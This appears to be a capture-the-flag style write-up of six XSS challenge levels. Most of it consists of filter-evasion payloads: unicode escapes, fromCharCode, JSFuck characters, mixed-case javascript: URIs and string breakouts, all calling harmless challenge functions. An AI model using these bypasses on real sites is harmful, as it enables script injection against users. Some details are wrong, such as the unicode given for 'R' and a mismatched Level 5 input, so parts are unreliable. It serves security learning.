**Sources**
1) https://null-byte.wonderhowto.com/how-to/advanced-techniques-bypass-defeat-xss-filters-part-1-0190257/
### Level 1
Solution is trivial. Add `<script>callFunction()</script>` and call your function.

### Level 2
First note is that in our scope we are within HTML tag context (in the body). So we can use unicode to input our characters as the character `n` is being filtered out.

The unicode for `n` is `\u006E`
So `<script>fancyFunction("48")</script>`
becomes `<script>fa\u006EcyFu\u006Ectio\u006E("48")</script>`

### Level 2 cont.
Identical to level 2 but now the character `R` (upper case) is filtered.
The unicode for `R` is `\u006E`. Trying to input this shows that the unicode is not being evaluated and is treated as a string:
```
<body>
    Hello, \u006E`
  </body>
```
To get the character `r` I use a javascript function to "generate" the "R" from it's ascii value.
```javascript
<script>eval(`brave${String.fromCharCode(82)}obot`)("63");</script>
```

*tip*: We can find the ascii value of any character with the following Javascript:
`"R".charCodeAt(0)`

### Level 3
Here we have two limitations:
1) Unable to use a space character
2) Unable to use `0`

Presumably the 0 was not allowed to avoid allowing me to use null chars or unicode.
`x"/onerror="kindSuperHero('1'+(1-1)+'3')`
Instead, I am able to use a `/` as a space in the attribute (*source 1*) which separated the `"x"` from `onerror` and can simply evaluate a `0` in the Javascript with `1-1`.

### Level 4
Here our limitation was simply disallowing `3`. Here we use the same as Level 2 but get `3` using it's ascii value of 51. We can use template literals to inject the value into the string:
```
<script>prettyFunction(`16${String.fromCharCode(51)}80`)</script>
```

### Level 4 cont.
We are given a limitation of not being able to use `r` in our payload.
With other examples, we can use Javascript to generate the character.
Here we are inside of an `<a>`'s href attribute:

```
<body>
  <a
    href="(payload)"
    title="Click me"
  >
    Click me
  </a>
</body>
```
To inject our payload we can use the `javascript:` uri to execute it. After `:` is when our Javascript is executed meaning the string `javascript` itself can't use JS to evaluate the `r` that is needed for the string.

Fortunately, it's not case sensitive. `javascRipt:` becomes our workaround.

I also use `jsfuck` to generate the `r` character instead of the previous methods.
Final solution:
```
javascRipt:eval(`tallSupe${(!![]+[])[+!+[]]}He${(!![]+[])[+!+[]]}o`)('45615')
```
Output:
```
<body>
    <a
      href="javascRipt:eval(`tallSupe${(!![]+[])[+!+[]]}He${(!![]+[])[+!+[]]}o`)('45615')"
      title="Click me"
    >
      Click me
    </a>
  </body>
```

### Level 5
As with level 4 part 1, it's a simple filter for `n`. Used JSfuck to generate the `n` once again.
in: ``` <script>eval(`prettyHuma${([][[]]+[])[+!+[]]}`)("xjsr3t")</script> ```
out: ```<body>Hello, <script>eval(`prettyHuma${([][[]]+[])[+!+[]]}`)("xjsr3t")</script></body>```

### Level 5 cont.
As with level 4 part 2, characters `A T` are not allowed. In this instance I assign `char` as a variable for `t` as it's needed in the JS payload twice.
in: ```jaAvascriptT:var char = (!![]+[])[+[]]; eval(`elegan${char}Human`)('ffhdb'+char)```
out:  
```
<body>
    <a
      href="jAvascripT:var char = (!![]+[])[+[]]; eval(`elegan${char}Human`)('ffhdb'+char)"
      title="Click me"
    >
      Click me
    </a>
  </body>
  ```
### Level 6
We have the following:

```html
<body>
  Hello, <span id="hello" />

  <script>
    var hello = '(payload)';

    document.getElementById('hello').innerHTML = hello;
  </script>
</body>
```
We are not allowed to use the letters `a,t` or space. This disallows us from using `eval` or `atob` for base64 strings.
We can either stay inside our Javascript context by breaking out of the quotes in the hello variable and continuing to write our own javascript.
Or we can write HTML into the `span` element as the script will add any text we create to that element.

We pick the second option and use the same unicode trick we used before to get our characters back:
in: ```<img/src="x"/onError="poli\u0074eRobo\u0074(`ezn0vio`)"></img>```
out:

```html
<body>
  Hello, <span id="hello" />

  <script>
    var hello = '<img/src="x"/onError="poli\u0074eRobo\u0074(`ezn0vio`)"></img>';

    document.getElementById('hello').innerHTML = hello;
  </script>
</body>
```

### Level 6
We have the following:
```html
<body>
  <script>
    window.appData = {
      "name": "(payload)"
    };
  </script>
</body>
```
We are already within Javascript context and we can easily break free and add an attribute to window.appData by simply adding on to where we've been inputted. We can make one of the object attributes equal to the value of the function we need to call.

Final payload
in: `","xss":eleg\u0061\u006EtRobot('2jp643zb'),"":"`
out: 
```html
<body>
  <script>
    window.appData = {
      "name": "","xss":eleg\u0061\u006EtRobot('2jp643zb'),"":""
    };
  </script>
</body>
```
